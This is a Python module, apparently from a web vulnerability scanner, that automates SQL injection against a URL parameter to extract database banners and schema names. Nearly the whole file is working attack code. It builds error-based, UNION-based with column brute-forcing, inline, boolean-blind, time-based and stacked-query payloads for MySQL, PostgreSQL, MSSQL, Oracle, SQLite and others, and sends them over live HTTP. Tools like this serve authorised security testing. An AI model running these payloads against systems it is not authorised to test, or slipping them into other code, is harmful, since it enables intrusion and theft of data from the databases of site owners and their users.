from lib.core import http
import re
import random
import logging
import time
from lib.core.result_manager import ResultManager
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

logger = logging.getLogger(__name__)
_processed_url_params = set()
MAX_UNION_COLUMNS = 20

def extract_between_delimiters(text, delimiter_start='~', delimiter_end='~'):
    pattern = re.compile(re.escape(delimiter_start) + r'(.*?)' + re.escape(delimiter_end), re.DOTALL)
    match = pattern.search(text)
    if match:
        return match.group(1).strip()
    return None

def extract_all_between_delimiters(text, delimiter_start='~', delimiter_end='~'):
    pattern = re.compile(re.escape(delimiter_start) + r'(.*?)' + re.escape(delimiter_end), re.DOTALL)
    values = []
    for match in pattern.findall(text):
        value = match.strip()
        if value and value not in values:
            values.append(value)
    return values

def replace_parameter(url, param, payload):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if param in params:
        original_value = params[param]
        params[param] = f"{original_value}{payload}"
    new_query = urlencode(params)
    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))

def set_parameter(url, param, value):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if param in params:
        params[param] = value
    new_query = urlencode(params)
    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))

def _top_level_from_index(expression):
    depth = 0
    upper_expression = expression.upper()
    for index, char in enumerate(expression):
        if char == "(":
            depth += 1
        elif char == ")" and depth:
            depth -= 1
        elif depth == 0 and upper_expression.startswith(" FROM ", index):
            return index
    return -1

def _split_union_expression(expression):
    from_index = _top_level_from_index(expression)
    if from_index < 0:
        return expression, ""
    return expression[:from_index], expression[from_index:]

def _union_expression_url(url, param, base_value, columns, injectable_column, expression):
    expression, from_clause = _split_union_expression(expression)
    column_values = ['NULL'] * columns
    column_values[injectable_column - 1] = expression
    payload_value = f"{base_value} UNION ALL SELECT {','.join(column_values)}{from_clause}-- -"
    return set_parameter(url, param, payload_value)

def _extract_union_value(url, param, base_value, columns, injectable_column, expression, delimiter_start, delimiter_end):
    test_url = _union_expression_url(
        url,
        param,
        base_value,
        columns,
        injectable_column,
        expression,
    )
    response = http.get(test_url, timeout=10, allow_redirects=True)
    return extract_between_delimiters(response.text, delimiter_start, delimiter_end)

def _extract_union_values(url, param, base_value, columns, injectable_column, expression, delimiter_start, delimiter_end):
    test_url = _union_expression_url(
        url,
        param,
        base_value,
        columns,
        injectable_column,
        expression,
    )
    response = http.get(test_url, timeout=10, allow_redirects=True)
    return extract_all_between_delimiters(response.text, delimiter_start, delimiter_end)

def _split_select_columns(select_list):
    columns = []
    current = []
    depth = 0
    for char in select_list:
        if char == "(":
            depth += 1
        elif char == ")" and depth:
            depth -= 1
        elif char == "," and depth == 0:
            columns.append("".join(current).strip())
            current = []
            continue
        current.append(char)
    columns.append("".join(current).strip())
    return columns

def _union_shape_from_payload(payload):
    match = re.search(r"\bUNION\s+ALL\s+SELECT\s+(.+?)(?:--|#|$)", payload, re.IGNORECASE)
    if not match:
        return None
    columns = _split_select_columns(match.group(1))
    injectable_column = None
    for index, column in enumerate(columns, start=1):
        if "CONCAT(" in column.upper():
            injectable_column = index
            break
    return len(columns), injectable_column

def _known_union_shapes(result_manager, url, param):
    shapes = []
    data = result_manager.get_results()
    for entry in data.get("scans", []):
        sql_block = entry.get("SQL Injection")
        if not isinstance(sql_block, dict):
            continue
        for finding in sql_block.get("Technique: Union-Query", []):
            finding_url = finding.get("Vulnerable URL") or finding.get("url")
            finding_param = finding.get("Injected Parameter") or finding.get("parameter")
            if finding_url != url or finding_param != param:
                continue

            columns = finding.get("Columns") or finding.get("columns")
            injectable_column = finding.get("Injectable Column") or finding.get("injectable_column")
            if not columns or not injectable_column:
                parsed_shape = _union_shape_from_payload(finding.get("Payload", ""))
                if parsed_shape:
                    columns, injectable_column = parsed_shape

            if columns and injectable_column:
                shape = (int(columns), int(injectable_column))
                if shape not in shapes:
                    shapes.append(shape)
    return shapes

def _candidate_union_shapes(result_manager, url, param):
    known_shapes = _known_union_shapes(result_manager, url, param)
    yielded = set()
    for shape in known_shapes:
        yielded.add(shape)
        yield shape
    for columns in range(1, MAX_UNION_COLUMNS + 1):
        for injectable_column in range(1, columns + 1):
            shape = (columns, injectable_column)
            if shape not in yielded:
                yield shape

def _mysql_union_databases(url, param, result_manager, base_value, delimiter_start, delimiter_end):
    for attempt, (columns, injectable_column) in enumerate(
        _candidate_union_shapes(result_manager, url, param),
        start=1,
    ):
        if attempt == 1 or attempt % 50 == 0:
            try:
                from lib.ui import print_status
                print_status(f"Trying MySQL UNION database enumeration with {columns} columns, column {injectable_column}", "info")
            except Exception:
                pass
        banner_expr = f"CONCAT('{delimiter_start}',VERSION(),'{delimiter_end}')"
        try:
            extracted_banner = _extract_union_value(
                url,
                param,
                base_value,
                columns,
                injectable_column,
                banner_expr,
                delimiter_start,
                delimiter_end,
            )
        except Exception:
            continue
        if not extracted_banner:
            continue

        extracted_dbs = []
        inband_expr = f"CONCAT('{delimiter_start}',IFNULL(CAST(schema_name AS CHAR),' '),'{delimiter_end}') FROM INFORMATION_SCHEMA.SCHEMATA"
        try:
            extracted_dbs = _extract_union_values(
                url,
                param,
                base_value,
                columns,
                injectable_column,
                inband_expr,
                delimiter_start,
                delimiter_end,
            )
        except Exception:
            extracted_dbs = []

        count_expr = f"CONCAT('{delimiter_start}',(SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),'{delimiter_end}')"
        try:
            db_count = _extract_union_value(
                url,
                param,
                base_value,
                columns,
                injectable_column,
                count_expr,
                delimiter_start,
                delimiter_end,
            )
            db_total = int(db_count) if db_count and db_count.isdigit() else 0
        except Exception:
            db_total = 0

        if db_total and len(extracted_dbs) < db_total:
            for offset in range(min(db_total, 100)):
                db_expr = f"CONCAT('{delimiter_start}',IFNULL(CAST(schema_name AS CHAR),' '),'{delimiter_end}') FROM (SELECT DISTINCT(schema_name) AS schema_name FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY schema_name) AS waymap_schemata LIMIT {offset},1"
                try:
                    db_name = _extract_union_value(
                        url,
                        param,
                        base_value,
                        columns,
                        injectable_column,
                        db_expr,
                        delimiter_start,
                        delimiter_end,
                    )
                except Exception:
                    db_name = None
                if db_name:
                    db_name = db_name.strip()
                    if db_name not in extracted_dbs:
                        extracted_dbs.append(db_name)

        if not extracted_dbs:
            group_expr = f"CONCAT('{delimiter_start}',(SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata),'{delimiter_end}')"
            try:
                extracted_dbs_str = _extract_union_value(
                    url,
                    param,
                    base_value,
                    columns,
                    injectable_column,
                    group_expr,
                    delimiter_start,
                    delimiter_end,
                )
                extracted_dbs = [db.strip() for db in extracted_dbs_str.split(',') if db.strip()] if extracted_dbs_str else []
            except Exception:
                extracted_dbs = []

        if extracted_dbs:
            return {
                "dbms": "MySQL",
                "banner": extracted_banner,
                "databases": extracted_dbs,
                "columns": columns,
                "injectable_column": injectable_column,
            }
    return None

def get_random_numbers():
    return random.randint(100, 999), random.randint(100, 999)

def get_random_string(length=8):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(chars) for _ in range(length))

def test_payload(test_url, delimiter_start, delimiter_end):
    try:
        response = http.get(test_url, timeout=10, allow_redirects=True)
        extracted = extract_between_delimiters(response.text, delimiter_start, delimiter_end)
        if extracted:
            return True, extracted
        return False, None
    except Exception:
        return False, None

def fetch_error_based(url, param, result_manager, domain):
    rnd1, rnd2 = get_random_numbers()
    delimiter_start = chr(0x7e)
    delimiter_end = chr(0x7e)

    banner_queries = {
        'MySQL': 'VERSION()',
        'PostgreSQL': 'VERSION()',
        'Microsoft SQL Server': '@@VERSION',
        'Oracle': '(SELECT banner FROM v$version WHERE ROWNUM=1)',
        'SQLite': '(SELECT sqlite_version())',
        'Firebird': '(SELECT RDB$GET_CONTEXT(\'SYSTEM\',\'ENGINE_VERSION\') FROM RDB$DATABASE)',
        'IBM DB2': '(SELECT service_level FROM TABLE(sysproc.env_get_inst_info()))',
        'HSQLDB': '(SELECT database_version FROM information_schema.system_info)',
        'SAP MaxDB': '(SELECT VERSION FROM DOMAIN.VERSIONS)'
    }

    db_queries = {
        'MySQL': '(SELECT GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata)',
        'PostgreSQL': 'STRING_AGG(schemaname, \',\') FROM pg_tables',
        'Microsoft SQL Server': 'STRING_AGG(name, \',\') FROM master.sys.databases',
        'Oracle': 'LISTAGG(owner, \',\') WITHIN GROUP (ORDER BY owner) FROM (SELECT DISTINCT owner FROM all_tables)',
        'SQLite': 'GROUP_CONCAT(name, \',\') FROM sqlite_master WHERE type=\'table\'',
        'Firebird': 'STRING_AGG(rdb$relation_name, \',\') FROM rdb$relations WHERE rdb$view_blr IS NULL',
        'IBM DB2': 'LISTAGG(catalog_name, \',\') FROM syscat.databases',
        'HSQLDB': 'STRING_AGG(table_schem, \',\') FROM information_schema.schemata',
        'SAP MaxDB': 'STRING_AGG(schemaname, \',\') FROM domain.schemata'
    }

    # MySQL Error-based payloads
    mysql_payloads = [
        lambda q: f" AND EXTRACTVALUE({rnd1},CONCAT(0x5c,0x{delimiter_start.encode('utf-8').hex()},{q},0x{delimiter_end.encode('utf-8').hex()}))-- -",
        lambda q: f" AND UPDATEXML({rnd1},CONCAT(0x2e,0x{delimiter_start.encode('utf-8').hex()},{q},0x{delimiter_end.encode('utf-8').hex()}),{rnd2})-- -",
        lambda q: f"' AND EXTRACTVALUE({rnd1},CONCAT(0x5c,0x{delimiter_start.encode('utf-8').hex()},{q},0x{delimiter_end.encode('utf-8').hex()}))-- -",
        lambda q: f"' AND UPDATEXML({rnd1},CONCAT(0x2e,0x{delimiter_start.encode('utf-8').hex()},{q},0x{delimiter_end.encode('utf-8').hex()}),{rnd2})-- -"
    ]

    # PostgreSQL Error-based payloads
    postgres_payloads = [
        lambda q: f"' AND {rnd1}=CAST('{delimiter_start}'||({q})::text||'{delimiter_end}' AS NUMERIC)--",
        lambda q: f"' AND 1=(SELECT CAST('{delimiter_start}'||({q})::text||'{delimiter_end}' AS NUMERIC))--"
    ]

    # MSSQL/Sybase Error-based payloads
    mssql_payloads = [
        lambda q: f"' AND {rnd1}=CONVERT(INT,(SELECT '{delimiter_start}'+({q})+'{delimiter_end}'))--",
        lambda q: f"' AND {rnd1} IN (SELECT ('{delimiter_start}'+({q})+'{delimiter_end}'))--"
    ]

    # Oracle Error-based payloads
    oracle_payloads = [
        lambda q: f"' AND {rnd1}=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'{delimiter_start}'||({q})||'{delimiter_end}'||CHR(62))) FROM DUAL)--",
        lambda q: f"' AND {rnd1}=UTL_INADDR.GET_HOST_ADDRESS('{delimiter_start}'||({q})||'{delimiter_end}')--"
    ]

    # Generic Firebird/SQLite/HSQLDB/MaxDB/DB2 payloads
    generic_payloads = [
        lambda q: f"' AND {rnd1}=('{delimiter_start}'||({q})||'{delimiter_end}')--",
        lambda q: f"' AND {rnd1}=RAISE_ERROR('70001','{delimiter_start}'||({q})||'{delimiter_end}')--"
    ]

    detected_dbms = None
    extracted_banner = None
    extracted_dbs = []
    success = False

    # Test all DBMS types with all available payloads
    for dbms, banner_query in banner_queries.items():
        payloads = []
        if dbms == 'MySQL':
            payloads = mysql_payloads
        elif dbms == 'PostgreSQL':
            payloads = postgres_payloads
        elif dbms == 'Microsoft SQL Server' or dbms == 'Sybase':
            payloads = mssql_payloads
        elif dbms == 'Oracle':
            payloads = oracle_payloads
        else:
            payloads = generic_payloads

        for payload_func in payloads:
            test_payload_banner = payload_func(banner_query)
            test_url = replace_parameter(url, param, test_payload_banner)
            success_banner, extracted_banner_val = test_payload(test_url, delimiter_start, delimiter_end)

            if success_banner:
                detected_dbms = dbms
                extracted_banner = extracted_banner_val
                success = True

                # Now try to get databases
                if dbms in db_queries:
                    db_query = db_queries[dbms]
                    for payload_func_db in payloads:
                        test_payload_db = payload_func_db(db_query)
                        test_url_db = replace_parameter(url, param, test_payload_db)
                        success_db, extracted_dbs_val = test_payload(test_url_db, delimiter_start, delimiter_end)
                        if success_db and extracted_dbs_val:
                            extracted_dbs = [db.strip() for db in extracted_dbs_val.split(',') if db.strip()]
                            break
                break
        if success:
            break

    if extracted_banner or extracted_dbs:
        logger.info("Successfully extracted data via Error-based SQLi")
        try:
            from lib.ui import print_success
            print_success(f"Detected DBMS: {detected_dbms or 'unknown'}")
            if extracted_banner:
                print_success(f"Database banner: {extracted_banner}")
            if extracted_dbs:
                print_success(f"Extracted databases: {', '.join(extracted_dbs)}")
        except Exception:
            pass
        result_manager.append_sql_injection(
            url,
            param,
            f"Error-based extraction successful (DBMS: {detected_dbms or 'unknown'})",
            extra={
                'dbms': detected_dbms,
                'banner': extracted_banner,
                'databases': extracted_dbs
            }
        )
        return bool(extracted_dbs)
    return False

def fetch_union_based(url, param, result_manager, domain):
    logger.info("Attempting Union-based SQLi extraction")
    try:
        rnd1, _ = get_random_numbers()
        delimiter_start = chr(0x7e)
        delimiter_end = chr(0x7e)
        base_value = f"-{rnd1}"
        mysql_result = _mysql_union_databases(
            url,
            param,
            result_manager,
            base_value,
            delimiter_start,
            delimiter_end,
        )
        if mysql_result:
            try:
                from lib.ui import print_success
                print_success(
                    f"Union columns: {mysql_result['columns']}, "
                    f"injectable column: {mysql_result['injectable_column']}"
                )
                print_success(f"Detected DBMS: {mysql_result['dbms']}")
                print_success(f"Database banner: {mysql_result['banner']}")
                print_success(f"Extracted databases: {', '.join(mysql_result['databases'])}")
            except Exception:
                pass
            result_manager.append_sql_injection(
                url,
                param,
                "Union-based extraction successful",
                extra=mysql_result,
            )
            return True

        banner_tests = [
            (f"CAST(CONCAT('{delimiter_start}',VERSION(),'{delimiter_end}') AS VARCHAR(10000))", 'PostgreSQL'),
            (f"CONCAT('{delimiter_start}',@@VERSION,'{delimiter_end}')", 'Microsoft SQL Server'),
            (f"'{delimiter_start}'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'{delimiter_end}'", 'Oracle'),
            (f"CONCAT('{delimiter_start}',sqlite_version(),'{delimiter_end}')", 'SQLite')
        ]
        db_queries = {
            'PostgreSQL': f"CAST(CONCAT('{delimiter_start}',(SELECT STRING_AGG(schemaname, ',') FROM pg_tables),'{delimiter_end}') AS VARCHAR(10000))",
            'Microsoft SQL Server': f"CONCAT('{delimiter_start}',(SELECT STRING_AGG(name, ',') FROM master.sys.databases),'{delimiter_end}')",
            'Oracle': f"'{delimiter_start}'||(SELECT LISTAGG(owner, ',') WITHIN GROUP (ORDER BY owner) FROM (SELECT DISTINCT owner FROM all_tables))||'{delimiter_end}'",
            'SQLite': f"CONCAT('{delimiter_start}',(SELECT GROUP_CONCAT(name, ',') FROM sqlite_master WHERE type='table'),'{delimiter_end}')"
        }

        for num_columns, inject_col in _candidate_union_shapes(result_manager, url, param):
            for banner_query, dbms_name in banner_tests:
                columns_list = ['NULL'] * num_columns
                columns_list[inject_col - 1] = banner_query
                payload_value = f"{base_value} UNION ALL SELECT {','.join(columns_list)}-- -"
                test_url = set_parameter(url, param, payload_value)

                try:
                    resp_data = http.get(test_url, timeout=10, allow_redirects=True)
                    extracted_banner = extract_between_delimiters(resp_data.text, delimiter_start, delimiter_end)
                    if not extracted_banner:
                        continue

                    logger.info(f"Union-based successful with {num_columns} columns, DBMS: {dbms_name}")
                    extracted_dbs = []
                    if dbms_name in db_queries:
                        columns_list_db = ['NULL'] * num_columns
                        columns_list_db[inject_col - 1] = db_queries[dbms_name]
                        db_payload_value = f"{base_value} UNION ALL SELECT {','.join(columns_list_db)}-- -"
                        test_url_db = set_parameter(url, param, db_payload_value)
                        resp_db = http.get(test_url_db, timeout=10, allow_redirects=True)
                        extracted_dbs_str = extract_between_delimiters(resp_db.text, delimiter_start, delimiter_end)
                        extracted_dbs = [db.strip() for db in extracted_dbs_str.split(',') if db.strip()] if extracted_dbs_str else []

                    try:
                        from lib.ui import print_success
                        print_success(f"Union columns: {num_columns}, injectable column: {inject_col}")
                        print_success(f"Detected DBMS: {dbms_name}")
                        if extracted_dbs:
                            print_success(f"Extracted databases: {', '.join(extracted_dbs)}")
                    except Exception:
                        pass

                    result_manager.append_sql_injection(
                        url,
                        param,
                        "Union-based extraction successful",
                        extra={
                            'dbms': dbms_name,
                            'banner': extracted_banner,
                            'databases': extracted_dbs,
                            'columns': num_columns,
                            'injectable_column': inject_col
                        }
                    )
                    return bool(extracted_dbs)
                except Exception:
                    continue

        return False
    except Exception as e:
        logger.error(f"Union-based extraction error: {str(e)}")
        return False

def fetch_inline_query(url, param, result_manager, domain):
    logger.info("Attempting Inline Query SQLi extraction")
    try:
        rnd1, rnd2 = get_random_numbers()
        delimiter_start = chr(0x7e)
        delimiter_end = chr(0x7e)

        banner_queries = {
            'MySQL': 'VERSION()',
            'PostgreSQL': 'VERSION()',
            'Microsoft SQL Server': '@@VERSION',
            'Sybase': '@@VERSION',
            'Oracle': '(SELECT banner FROM v$version WHERE ROWNUM=1)',
            'SQLite': 'sqlite_version()',
            'Firebird': 'RDB$GET_CONTEXT(\'SYSTEM\',\'ENGINE_VERSION\')',
            'ClickHouse': 'version()'
        }

        db_queries = {
            'MySQL': 'GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata',
            'PostgreSQL': 'STRING_AGG(schemaname, \',\') FROM pg_tables',
            'Microsoft SQL Server': 'STRING_AGG(name, \',\') FROM master.sys.databases',
            'Sybase': 'STRING_AGG(name, \',\') FROM master.sys.databases',
            'Oracle': 'LISTAGG(owner, \',\') WITHIN GROUP (ORDER BY owner) FROM (SELECT DISTINCT owner FROM all_tables)',
            'SQLite': 'GROUP_CONCAT(name, \',\') FROM sqlite_master WHERE type=\'table\'',
            'Firebird': 'STRING_AGG(rdb$relation_name, \',\') FROM rdb$relations WHERE rdb$view_blr IS NULL'
        }

        # Inline query payload templates
        inline_payloads = {
            'MySQL': lambda q: f"' AND (SELECT CONCAT('{delimiter_start}',({q}),'{delimiter_end}'))-- -",
            'PostgreSQL': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})::text||'{delimiter_end}')-- -",
            'Microsoft SQL Server': lambda q: f"' AND (SELECT '{delimiter_start}'+({q})+'{delimiter_end}')-- -",
            'Sybase': lambda q: f"' AND (SELECT '{delimiter_start}'+({q})+'{delimiter_end}')-- -",
            'Oracle': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})||'{delimiter_end}' FROM DUAL)-- -",
            'SQLite': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})||'{delimiter_end}')-- -",
            'Firebird': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})||'{delimiter_end}' FROM RDB$DATABASE)-- -",
            'ClickHouse': lambda q: f"' AND ('{delimiter_start}'||CAST(({q}) AS String)||'{delimiter_end}')-- -"
        }

        detected_dbms = None
        extracted_banner = None
        extracted_dbs = []
        success = False

        for dbms, banner_query in banner_queries.items():
            if dbms in inline_payloads:
                payload_func = inline_payloads[dbms]
                test_banner_payload = payload_func(banner_query)
                test_url = replace_parameter(url, param, test_banner_payload)
                success_banner, extracted_banner_val = test_payload(test_url, delimiter_start, delimiter_end)

                if success_banner:
                    detected_dbms = dbms
                    extracted_banner = extracted_banner_val
                    success = True

                    if dbms in db_queries:
                        db_query = db_queries[dbms]
                        test_db_payload = payload_func(db_query)
                        test_url_db = replace_parameter(url, param, test_db_payload)
                        success_db, extracted_dbs_val = test_payload(test_url_db, delimiter_start, delimiter_end)
                        if success_db and extracted_dbs_val:
                            extracted_dbs = [db.strip() for db in extracted_dbs_val.split(',') if db.strip()]
                    break

        if extracted_banner or extracted_dbs:
            logger.info("Successfully extracted data via Inline Query SQLi")
            result_manager.append_sql_injection(
                url,
                param,
                f"Inline query extraction successful (DBMS: {detected_dbms or 'unknown'})",
                extra={
                    'dbms': detected_dbms,
                    'banner': extracted_banner,
                    'databases': extracted_dbs
                }
            )
            return bool(extracted_dbs)
        return False
    except Exception as e:
        logger.error(f"Inline query extraction error: {str(e)}")
        return False

def fetch_boolean_blind(url, param, result_manager, domain):
    logger.info("Attempting Boolean Blind SQLi extraction")
    try:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        original_value = params.get(param, '')

        baseline_urls = []
        for prefix in ["' AND 1=1-- -", "' OR 1=1-- -"]:
            test_url = replace_parameter(url, param, prefix)
            try:
                res = http.get(test_url, timeout=10, allow_redirects=True)
                baseline_urls.append((len(res.text), res.status_code, test_url))
            except Exception:
                continue

        if not baseline_urls:
            return False

        true_baseline = baseline_urls[0]

        def is_condition_true(condition_payload):
            test_url = replace_parameter(url, param, condition_payload)
            try:
                res = http.get(test_url, timeout=10, allow_redirects=True)
                return (len(res.text), res.status_code) == (true_baseline[0], true_baseline[1])
            except Exception:
                return False

        def get_value(query):
            value = ""
            for pos in range(1, 200):
                found = False
                # Binary search for faster extraction
                low = 32
                high = 127
                while low <= high:
                    mid = (low + high) // 2
                    payload_gt = f"' AND ASCII(MID(({query}),{pos},1))>{mid}-- -"
                    if is_condition_true(payload_gt):
                        low = mid + 1
                    else:
                        payload_eq = f"' AND ASCII(MID(({query}),{pos},1))={mid}-- -"
                        if is_condition_true(payload_eq):
                            value += chr(mid)
                            found = True
                            break
                        else:
                            high = mid - 1
                if not found:
                    break
            return value

        count = get_value("SELECT COUNT(DISTINCT(schema_name)) FROM information_schema.schemata")
        if not count or not count.isdigit():
            return False

        extracted_dbs = []
        for i in range(int(count)):
            db_name = get_value(f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1")
            if db_name:
                extracted_dbs.append(db_name)

        if extracted_dbs:
            result_manager.append_sql_injection(
                url,
                param,
                "Boolean Blind extraction successful",
                extra={'databases': extracted_dbs}
            )
            logger.info("Successfully extracted databases via Boolean Blind SQLi")
            return True
    except Exception as e:
        logger.error(f"Boolean Blind extraction error: {str(e)}")
    return False

def fetch_time_based(url, param, result_manager, domain):
    logger.info("Attempting Time-based SQLi extraction")
    sleep_time = 5
    try:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))

        def is_condition_true(condition_payload):
            test_url = replace_parameter(url, param, condition_payload)
            try:
                start = time.time()
                http.get(test_url, timeout=15, allow_redirects=True)
                elapsed = time.time() - start
                return elapsed >= (sleep_time - 1)  # Some tolerance
            except Exception:
                return False

        def get_value(query):
            value = ""
            for pos in range(1, 200):
                found = False
                low = 32
                high = 127
                while low <= high:
                    mid = (low + high) // 2
                    # Try multiple time-based techniques for different DBMS
                    payloads = [
                        f"' AND IF(ASCII(MID(({query}),{pos},1))>{mid},SLEEP({sleep_time}),0)-- -",  # MySQL
                        f"' AND {random.randint(100,999)}=(SELECT CASE WHEN (ASCII(MID(({query}),{pos},1))>{mid}) THEN (SELECT {random.randint(100,999)} FROM PG_SLEEP({sleep_time})) ELSE {random.randint(100,999)} END)--",  # PostgreSQL
                        f"' IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid}) WAITFOR DELAY '0:0:{sleep_time}'--",  # MSSQL
                        f"' AND {random.randint(100,999)}=(SELECT CASE WHEN (ASCII(MID(({query}),{pos},1))>{mid}) THEN DBMS_PIPE.RECEIVE_MESSAGE('{get_random_string()}',{sleep_time}) ELSE {random.randint(100,999)} END FROM DUAL)--"  # Oracle
                    ]

                    for payload_gt in payloads:
                        if is_condition_true(payload_gt):
                            low = mid + 1
                            break
                    else:
                        payload_eq = f"' AND IF(ASCII(MID(({query}),{pos},1))={mid},SLEEP({sleep_time}),0)-- -"
                        if is_condition_true(payload_eq):
                            value += chr(mid)
                            found = True
                            break
                        else:
                            high = mid - 1
                if not found:
                    break
            return value

        count = get_value("SELECT COUNT(DISTINCT(schema_name)) FROM information_schema.schemata")
        if not count or not count.isdigit():
            return False

        extracted_dbs = []
        for i in range(int(count)):
            db_name = get_value(f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1")
            if db_name:
                extracted_dbs.append(db_name)

        if extracted_dbs:
            result_manager.append_sql_injection(
                url,
                param,
                "Time-based extraction successful",
                extra={'databases': extracted_dbs}
            )
            logger.info("Successfully extracted databases via Time-based SQLi")
            return True
    except Exception as e:
        logger.error(f"Time-based extraction error: {str(e)}")
    return False

def fetch_stacked_queries(url, param, result_manager, domain):
    logger.info("Attempting Stacked Queries SQLi test")
    try:
        sleep_time = 5
        rnd_str = get_random_string()

        # Stacked query payloads for different DBMS
        stacked_payloads = [
            # MySQL
            (f";SELECT SLEEP({sleep_time})-- -", "MySQL"),
            (f";SELECT SLEEP({sleep_time})#", "MySQL"),
            (f";(SELECT * FROM (SELECT(SLEEP({sleep_time}))) {rnd_str})-- -", "MySQL"),
            
            # PostgreSQL
            (f";SELECT PG_SLEEP({sleep_time})-- -", "PostgreSQL"),
            (f";SELECT PG_SLEEP({sleep_time})", "PostgreSQL"),
            
            # MSSQL/Sybase
            (f";WAITFOR DELAY '0:0:{sleep_time}'-- -", "Microsoft SQL Server"),
            (f";WAITFOR DELAY '0:0:{sleep_time}'", "Microsoft SQL Server"),
            (f";DECLARE @x CHAR(9);SET @x=0x303a303a3{sleep_time};WAITFOR DELAY @x-- -", "Microsoft SQL Server"),
            
            # Oracle
            (f";SELECT DBMS_PIPE.RECEIVE_MESSAGE('{rnd_str}',{sleep_time}) FROM DUAL-- -", "Oracle"),
            (f";BEGIN DBMS_LOCK.SLEEP({sleep_time}); END-- -", "Oracle")
        ]

        for payload, dbms in stacked_payloads:
            test_url = replace_parameter(url, param, payload)
            try:
                start = time.time()
                response = http.get(test_url, timeout=20, allow_redirects=True)
                elapsed = time.time() - start
                if elapsed >= sleep_time - 1:
                    logger.info(f"Stacked queries successful for DBMS: {dbms}")
                    result_manager.append_sql_injection(
                        url,
                        param,
                        f"Stacked queries extraction successful (DBMS: {dbms})",
                        extra={'dbms': dbms, 'sleep_time_detected': elapsed}
                    )
                    return False
            except Exception:
                continue

        return False
    except Exception as e:
        logger.error(f"Stacked queries test error: {str(e)}")
        return False

def fetch_databases_once(url, param, verbose=False):
    key = (url, param)
    if key in _processed_url_params:
        return
    _processed_url_params.add(key)

    domain = urlparse(url).netloc
    result_manager = ResultManager(domain)

    from lib.ui import print_header, print_success, print_warning, print_error

    print_header("Database Name Extraction", color="yellow")

    success = False

    # Order of preference
    if not success:
        success = fetch_error_based(url, param, result_manager, domain)
    if not success:
        print_warning("Error-based database names unavailable, trying Union-based")
        success = fetch_union_based(url, param, result_manager, domain)
    if not success:
        print_warning("Union-based database names unavailable, trying Inline query")
        success = fetch_inline_query(url, param, result_manager, domain)
    if not success:
        print_warning("Inline query database names unavailable, trying Stacked queries")
        success = fetch_stacked_queries(url, param, result_manager, domain)
    if not success:
        print_warning("Stacked queries cannot list databases here, trying Boolean Blind")
        success = fetch_boolean_blind(url, param, result_manager, domain)
    if not success:
        print_warning("Boolean Blind database names unavailable, trying Time-based")
        success = fetch_time_based(url, param, result_manager, domain)

    if not success:
        print_warning("Could not extract databases with available techniques.")
